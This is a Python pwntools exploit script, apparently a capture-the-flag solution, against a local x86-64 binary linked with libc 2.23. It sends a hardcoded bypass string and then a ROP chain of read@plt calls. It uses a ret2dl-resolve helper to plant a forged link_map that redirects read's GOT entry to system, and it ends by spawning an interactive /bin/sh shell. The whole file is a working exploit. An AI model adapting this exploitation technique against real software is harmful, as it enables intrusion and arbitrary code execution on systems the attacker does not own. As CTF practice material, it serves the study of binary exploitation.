# -*- coding: UTF-8 -*-
from pwn import *
from RET2DL64 import build
p = process("./main")
elf = ELF("./main")
libc =ELF('./libc-2.23.so',checksec=False)
temp = [9,174,60,134,126,116,199,19,180,247,136,200,118,223,191,250,245,170,36,108,48,233,235,126,9,39,205,190,78,43,2,0,237,41,208,91,151,88,196,231,174,153,62,53,115,8,114,248,202,31]
pop_rdi_ret = 0x00000000004012C3
pop_rsi_r15 = 0x00000000004012C1
bypass = ''
for i in range(len(temp)):
	bypass += chr(temp[i])
#gdb.attach(a,"b *0x40054A")
GLOBAL = 0x602000
reloc_index = 1
fake = elf.bss() + 0x108
argu = fake + 0x100
one_got = elf.got['read']
offset  = (libc.sym['system'] - libc.sym['read'])&0xFFFFFFFFFFFFFFFF

link_map  =build(fake,one_got,reloc_index,offset)
link_map += '/bin/sh'
p.sendline(bypass)
payload = '\x00'*0x78
payload += p64(pop_rsi_r15) + p64(fake) + p64(0) + p64(elf.plt['read'])
payload += p64(pop_rsi_r15) + p64(GLOBAL) + p64(0) + p64(elf.plt['read'])
payload += p64(pop_rsi_r15) + p64(GLOBAL + 0x20) + p64(0) + p64(elf.plt['read'])
payload += p64(pop_rdi_ret) + p64(argu) + p64(elf.plt['__libc_start_main'])
p.sendline(payload)
p.sendline(link_map)
p.send(p64(0x601E28) + p64(fake))
sleep(0.2)
p.send(p64(elf.plt['__libc_start_main'] + 6))

p.interactive()
